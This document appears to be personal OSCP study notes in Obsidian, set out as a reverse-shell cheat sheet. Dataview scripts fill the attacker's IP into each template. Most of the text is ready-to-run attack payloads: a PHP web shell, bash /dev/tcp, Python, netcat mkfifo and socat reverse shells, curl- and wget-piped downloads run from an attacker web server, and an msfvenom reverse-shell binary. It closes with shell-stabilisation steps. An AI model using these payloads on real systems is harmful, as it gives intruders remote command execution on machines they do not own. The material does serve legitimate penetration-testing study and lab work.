https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

https://www.revshells.com

Find out which architecture is supported
```
which python3 python perl ruby socat script
```

---
## WEB SHELL

```
<?php system($_GET['cmd']);?>
```

Visit and modify this URL to execute
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `http://${ip}:3305/webshell.php?cmd=[cmd]`;

dv.paragraph("```bash\n" + command + "\n```");
```
On KALI ATTACKER, modify bash.sh file (Port 4444 does not work)
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `cd ~/Desktop/Tools/PHPShells && echo "bash -i >& /dev/tcp/${KaliIP}/3305 0>&1" > bash.sh && python3 -m http.server 80`;

dv.paragraph("```bash\n" + command + "\n```");
```
On KALI ATTACKER 2nd Terminal Panel, (Port 4444 does not work)
```
cd ~/Desktop/Tools && python3 penelope.py -p 3305 -O / --oscp-safe
```

In webshell, grab bash.sh, type these 2 cmds
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `wget http://${KaliIP}/bash.sh -O /tmp/bash.sh`;

dv.paragraph("```bash\n" + command + "\n```");
```
&&

```
/bin/bash /tmp/bash.sh
```

---
## LINUX WEB SHELL

HIGH PROBABILITY
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `bash -c "bash -i >& /dev/tcp/${KaliIP}/4444 0>&1"`;

dv.paragraph("```bash\n" + command + "\n```");
```

---

## Python One liner reverse-shell
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${KaliIP}",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`;

dv.paragraph("```bash\n" + command + "\n```");
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${KaliIP}\",25));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"`;

dv.paragraph("```bash\n" + command + "\n```");
```

---

## Bash reverse shells
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `/bin/bash -c 'bash -i >& /dev/tcp/${KaliIP}/4444 0>&1'`;

dv.paragraph("```bash\n" + command + "\n```");
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `bash -c 'bash -i >& /dev/tcp/${KaliIP}/4444 0>&1'`;

dv.paragraph("```bash\n" + command + "\n```");
```

---

## SH
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `sh -i >& /dev/tcp/${KaliIP}/4444 0>&1`;

dv.paragraph("```bash\n" + command + "\n```");
```

---


PHP METHOD 1

[Pentestmonkey php reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

```
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php -O shell.php
```

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/${KaliIP}/80 0>&1'");
?>`;

dv.paragraph("```bash\n" + command + "\n```");
```


---

PHP METHOD 2

system() function to run curl and fetch a bash script from our local web server, which is then piped to bash , triggering a reverse shell.
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `<?php system("curl ${KaliIP}:8080/rev.sh|bash;"); ?>`;

dv.paragraph("```bash\n" + command + "\n```");
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");
const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `echo -e '#!/bin/bash\\nsh -i >& /dev/tcp/${KaliIP}/4444 0>&1' > rev.sh`;

dv.paragraph("```bash\n" + command + "\n```");
```

Output rev.sh
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `#!/bin/bash
sh -i >& /dev/tcp/${KaliIP}/4444 0>&1`;

dv.paragraph("```bash\n" + command + "\n```");
```
Trigger the reverse-shell
```
curl -k "http://dev.devvortex.htb/templates/cassiopeia/error.php/error"
```

PHP METHOD 3

Start a nc listener

```
nc -lvnp 4444
```

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `<?PHP echo system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${KaliIP} 4444 >/tmp/f");?>`;

dv.paragraph("```bash\n" + command + "\n```");
```
---

## Socat

On the attacker machine, we started a listener:
```
socat file:`tty`,raw,echo=0 tcp-listen:4444
```
or
```
rlwrap nc -lvnp 4444
```

On the target machine, we executed the following command:
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${KaliIP}:4444`;

dv.paragraph("```bash\n" + command + "\n```");
```

---



# 🔁 If `/dev/tcp` Fails

Try Python (very reliable):
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${KaliIP}",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'`;

dv.paragraph("```bash\n" + command + "\n```");
```
If only python2 exists:
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `python -c 'import socket,os,pty;s=socket.socket();s.connect(("${KaliIP}",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'`;

dv.paragraph("```bash\n" + command + "\n```");
```

---

```
vim shell.sh
```

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `#!/bin/bash
bash -i >& /dev/tcp/${KaliIP}/80 0>&1`;

dv.paragraph("```bash\n" + command + "\n```");
```

```
python3 -m http.server 80
```

Cmd in RCE payload
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `curl+${KaliIP}:80/shell.sh|bash`;

dv.paragraph("```bash\n" + command + "\n```");
```

## MSFVENOM
---
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `msfvenom -p linux/x86/shell_reverse_tcp LHOST=${KaliIP} LPORT=4444 -f elf > reverse.elf`;

dv.paragraph("```bash\n" + command + "\n```");
```

---
# 🎯 Step 3 — Stabilize the Shell

Once connected:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

CTRL + Z  

```
stty raw -echo
```

```
fg
```

ENTER

```
export TERM=xterm
```

ENTER 

Now you have a proper TTY.

---

